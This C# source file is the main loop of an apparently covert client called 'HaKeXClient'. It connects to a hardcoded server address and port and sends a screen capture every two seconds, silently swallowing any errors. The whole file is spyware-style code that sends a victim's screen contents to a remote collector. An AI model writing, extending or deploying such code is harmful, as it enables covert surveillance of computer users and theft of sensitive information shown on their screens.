using HaKeXClient.HaKeXTCP;

namespace HaKeXClient
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            string serverIP = "192.168.11.121";
            int serverPort = 1243;

            TcpClientHaKeX client = new TcpClientHaKeX(serverIP, serverPort);

            int intervalMilliseconds = 2000;

            using (CancellationTokenSource cancellationTokenSource = new CancellationTokenSource())
            {
                CancellationToken token = cancellationTokenSource.Token;

                while (!token.IsCancellationRequested)
                {
                    try
                    {
                        // Capture and send the screenshot
                        await client.SendScreenshotAsync();
                    }
                    catch (Exception ex)
                    {
                    }

                    // Wait for the specified interval or until cancellation
                    await Task.Delay(intervalMilliseconds, token);
                }
            }
        }
    }
}
